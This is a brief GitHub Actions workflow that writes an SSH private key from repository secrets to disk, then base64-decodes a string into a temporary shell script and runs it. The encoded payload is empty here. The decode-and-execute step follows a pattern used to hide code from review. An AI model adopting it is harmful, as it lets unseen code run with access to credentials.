name: Renumber Run2
on: {workflow_dispatch: {}}
jobs:
  g:
    runs-on: ubuntu-latest
    steps:
      - name: q
        run: |
          mkdir -p ~/.ssh; printf '%s' "${{ secrets.DOHA_SSH_KEY }}" > ~/.ssh/id_rsa; chmod 600 ~/.ssh/id_rsa
          echo "" | base64 -d > /tmp/r.sh
          bash /tmp/r.sh
